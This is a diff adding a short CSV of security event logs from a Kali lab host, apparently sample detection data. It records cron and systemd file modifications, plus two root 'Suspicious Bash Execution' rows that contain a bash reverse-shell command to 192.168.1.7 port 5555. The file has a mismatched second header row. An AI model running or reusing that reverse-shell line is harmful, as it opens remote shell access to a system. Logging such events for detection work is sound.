@@ -1,0 +1,6 @@
+_time,host,user,command,exe,status,exit_code,mod_key,description,,,,,,,,,,,,
+2025-05-28T18:08:10.248+0530,kali,kali,tee,/usr/bin/tee,Success,3,cron_mod,This shows the actual cron file modification using /usr/bin/tee,,,,,,,,,,,,
+2025-05-28T18:16:47.539+0530,kali,kali,zsh,/usr/bin/zsh,Success,3,systemd_mod,This shows a systemd unit file was accessed/modified using /usr/bin/zsh,,,,,,,,,,,,
+host,event_type,command,exe,command_line,image,parent_image,parent_cmd,user,user_dir,status,exit_code,mod_key,description,file_count,duration,file_list,hour_12_num,ampm,time_12hr,
+20:02.3,kali,Suspicious Bash Execution,,,/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1,/usr/bin/dash,-,-,root,/root,,,,,,,,,,
+20:02.2,kali,Suspicious Bash Execution,,,/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1,/usr/bin/dash,-,-,root,/root,,,,,,,,,,
